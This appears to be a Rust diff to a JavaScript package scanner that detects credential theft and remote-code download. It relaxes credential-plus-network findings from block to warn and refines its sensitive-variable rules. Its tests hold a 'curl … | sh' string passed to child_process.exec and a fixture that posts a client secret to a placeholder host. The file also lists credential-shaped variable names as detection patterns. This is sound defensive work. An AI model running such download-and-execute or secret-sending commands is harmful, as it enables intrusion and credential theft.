@@ -92,18 +92,13 @@ pub enum Verdict {
 pub fn verdict(b: &Behavior, has_install_script: bool) -> (Verdict, Vec<String>) {
     let mut reasons = Vec::new();
     let mut block = false;
+    let credential_network = (b.sensitive_env || b.cred_path) && b.net;
 
-    // High-confidence exfil: a SPECIFIC sensitive secret (token/key/AWS/...) or a
-    // credential-file path read alongside a network sink.
-    if (b.sensitive_env || b.cred_path) && b.net {
-        block = true;
-        reasons.push("exfiltration: sensitive credentials read alongside a network sink".into());
-    }
     // Whole-`process.env` capture + network is common in legitimate build tools
     // (vite/webpack `define`, env forwarding to workers), so it only Blocks when a
     // real payload marker co-occurs (attacker host, decode, or worm/secret-stealer
     // markers). Bare whole-env + network downgrades to a Warn below.
-    else if b.env_whole && b.net && (b.suspicious_host || b.worm_marker) {
+    if b.env_whole && b.net && (b.suspicious_host || b.worm_marker) {
         block = true;
         reasons.push("exfiltration: full environment captured and sent to a network sink".into());
     }
@@ -144,6 +139,13 @@ pub fn verdict(b: &Behavior, has_install_script: bool) -> (Verdict, Vec<String>)
     }
 
     let mut warn = false;
+    if credential_network {
+        warn = true;
+        reasons.push(
+            "sensitive credentials and network access occur in the same file; review the destination"
+                .into(),
+        );
+    }
     if b.strong_source() && b.subprocess {
         warn = true;
         reasons.push("reads secrets and spawns processes".into());
@@ -250,23 +252,24 @@ fn callee_name(callee: &Expression) -> Option<String> {
     }
 }
 
-const SENSITIVE_ENV: &[&str] = &[
-    "TOKEN",
-    "SECRET",
-    "PASSWORD",
-    "PASSWD",
-    "PRIVATE",
-    "APIKEY",
-    "API_KEY",
-    "AWS",
-    "GITHUB",
-    "GH_TOKEN",
-    "NPM_TOKEN",
-    "SSH",
-    "CREDENTIAL",
-    "ACCESS_KEY",
-    "CLIENT_SECRET",
-];
+fn is_sensitive_env_name(name: &str) -> bool {
+    name == "TOKEN"
+        || name.ends_with("_TOKEN")
+        || name == "SECRET"
+        || name.ends_with("_SECRET")
+        || name.contains("CLIENT_SECRET")
+        || name == "PASSWORD"
+        || name.ends_with("_PASSWORD")
+        || name == "PASSWD"
+        || name.ends_with("_PASSWD")
+        || name.contains("PRIVATE_KEY")
+        || name.contains("ACCESS_KEY")
+        || name == "APIKEY"
+        || name.ends_with("_APIKEY")
+        || name == "API_KEY"
+        || name.ends_with("_API_KEY")
+        || name.contains("CREDENTIAL")
+}
 
 // Genuine secret/credential targets only. Deliberately excludes:
 //   - the `.env*` family: standard dotenv files that essentially every build
@@ -346,6 +349,21 @@ fn looks_base64ish(s: &str) -> bool {
             .all(|c| c.is_ascii_alphanumeric() || c == b'+' || c == b'/' || c == b'=')
 }
 
+fn contains_shell_download(s: &str) -> bool {
+    SHELL_DOWNLOAD.iter().any(|candidate| s.contains(candidate))
+}
+
+fn argument_contains_shell_download(arg: &Argument<'_>) -> bool {
+    match arg.as_expression() {
+        Some(Expression::StringLiteral(s)) => contains_shell_download(s.value.as_str()),
+        Some(Expression::TemplateLiteral(t)) => t
+            .quasis
+            .iter()
+            .any(|q| contains_shell_download(q.value.raw.as_str())),
+        _ => false,
+    }
+}
+
 impl<'a> BehaviorVisitor<'a> {
     /// Does this argument expression decode data (base64/charcode)?
     fn arg_is_decode(&self, arg: &Expression) -> bool {
@@ -375,9 +393,6 @@ impl<'a> BehaviorVisitor<'a> {
         }
         if WORM_MARKER.iter().any(|w| v.contains(w)) {
             self.b.worm_marker = true;
-        }
-        if SHELL_DOWNLOAD.iter().any(|c| v.contains(c)) {
-            self.b.shell_download = true;
         }
     }
 
@@ -462,6 +477,9 @@ impl<'a> Visit<'a> for BehaviorVisitor<'a> {
                 || n.ends_with(".execFile")
             {
                 self.b.subprocess = true;
+                if it.arguments.iter().any(argument_contains_shell_download) {
+                    self.b.shell_download = true;
+                }
             }
 
             // decode primitives (neutral on their own)
@@ -489,7 +507,7 @@ impl<'a> Visit<'a> for BehaviorVisitor<'a> {
             if is_process_env(&m.object) {
                 self.b.env_read = true;
                 let prop = m.property.name.as_str().to_ascii_uppercase();
-                if SENSITIVE_ENV.iter().any(|s| prop.contains(s)) {
+                if is_sensitive_env_name(&prop) {
                     self.b.sensitive_env = true;
                 }
             }
@@ -530,5 +548,67 @@ fn infer_source_type(path: &str) -> SourceType {
         SourceType::mjs()
     } else {
         SourceType::cjs()
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn shell_download_text_is_not_execution() {
+        let behavior = analyze_file(
+            r#"console.log("Try curl https://example.com if the request fails");"#,
+            "index.js",
+        );
+
+        assert!(!behavior.shell_download);
+        assert!(!behavior.subprocess);
+    }
+
+    #[test]
+    fn shell_download_passed_to_exec_is_detected() {
+        let behavior = analyze_file(
+            r#"const cp = require("child_process"); cp.exec("curl https://example.com/p | sh");"#,
+            "index.js",
+        );
+
+        assert!(behavior.shell_download);
+        assert!(behavior.subprocess);
+    }
+
+    #[test]
+    fn framework_metadata_env_names_are_not_credentials() {
+        for name in ["NEXT_PRIVATE_ORIGIN", "AWS_REGION", "GITHUB_SHA"] {
+            assert!(!is_sensitive_env_name(name), "{name} must remain metadata");
+        }
+    }
+
+    #[test]
+    fn credential_shaped_env_names_remain_sensitive() {
+        for name in [
+            "NPM_TOKEN",
+            "AWS_SECRET_ACCESS_KEY",
+            "WORKOS_API_SECRET",
+            "DATABASE_PASSWORD",
+            "GOOGLE_APPLICATION_CREDENTIALS",
+        ] {
+            assert!(is_sensitive_env_name(name), "{name} must remain sensitive");
+        }
+    }
+
+    #[test]
+    fn credential_and_network_without_payload_markers_warns() {
+        let behavior = analyze_file(
+            r#"
+            const secret = process.env.CLIENT_SECRET;
+            fetch("https://auth.example.com", { method: "POST", body: secret });
+            "#,
+            "index.js",
+        );
+        let (verdict, reasons) = verdict(&behavior, false);
+
+        assert_eq!(verdict, Verdict::Warn);
+        assert_eq!(reasons.len(), 1);
     }
 }
